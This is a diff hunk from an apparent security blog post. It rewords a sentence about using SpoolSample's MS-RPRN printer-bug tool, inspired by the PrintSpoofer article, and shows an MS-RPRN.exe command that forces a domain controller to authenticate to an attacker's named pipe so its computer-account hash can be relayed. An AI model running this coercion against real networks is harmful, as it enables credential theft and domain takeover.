@@ -251,7 +251,7 @@ This idea was nice with the background thought, that we have local `and` network
 
 ---
 
-<a href="https://twitter.com/itm4n">@itm4n's</a> article about  PrintSpoofer - <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a> - I also had the idea and tested, if it's possible to relay a Domain Controllers Computer-Account Hash to our Named Pipe via Spoolsample. This can be done with the MS-RPRN part of the <a href="Spoolsample code">https://github.com/leechristensen/SpoolSample/tree/master/MS-RPRN</a> by using `/` instead of `\` for the target system like this:
+Having <a href="https://twitter.com/itm4n">@itm4n's</a> article about  PrintSpoofer - <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a> - in mind, I also had the idea, if it's possible to relay a Domain Controllers Computer-Account Hash to our Named Pipe via Spoolsample. This can be done with the MS-RPRN part of the <a href="Spoolsample code">https://github.com/leechristensen/SpoolSample/tree/master/MS-RPRN</a> by using `/` instead of `\` for the target system like this:
 
 ```batch
 MS-RPRN.exe \\DomainControllerFQDN \\OutCompromisedSystemFQDN/pipe/pipename
